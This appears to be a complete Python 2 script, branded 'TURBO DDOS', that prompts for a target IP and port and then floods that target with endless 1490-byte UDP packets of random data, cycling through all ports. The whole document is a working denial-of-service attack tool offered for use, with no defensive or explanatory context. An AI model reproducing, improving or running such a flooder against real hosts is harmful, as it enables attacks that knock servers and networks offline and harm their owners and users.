import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
print("\033[92m")
os.system("clear")
os.system("figlet TURBO DDOS")
ip = raw_input("IP   : ")
port = input("Port : ")
os.system("clear")
print("\033[93m")
os.system("figlet Turbo Attack")
print ("\033[96m")
print("Load FILE")
print("")
time.sleep(2.1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 0.5
     port = port + 1
     print "Sent File %s"%(sent)
     if port == 65534:
       port = 1
